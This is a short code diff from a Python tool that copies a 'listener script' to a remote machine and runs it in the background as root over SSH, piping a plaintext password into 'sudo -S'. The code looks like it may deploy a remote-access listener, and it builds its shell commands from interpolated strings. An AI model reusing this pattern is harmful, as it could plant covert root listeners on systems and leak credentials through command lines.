@@ -32,7 +32,7 @@ def install(address):
     subprocess.run(scp_command, shell=True, check=True)
     print(f"Listener script copied over to {address}")
             
-    command = f"bash /tmp/no {fileEncode}"
+    command = f"bash /tmp/no {fileEncode} &"
     stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
     time.sleep(1)
 def connect(address):
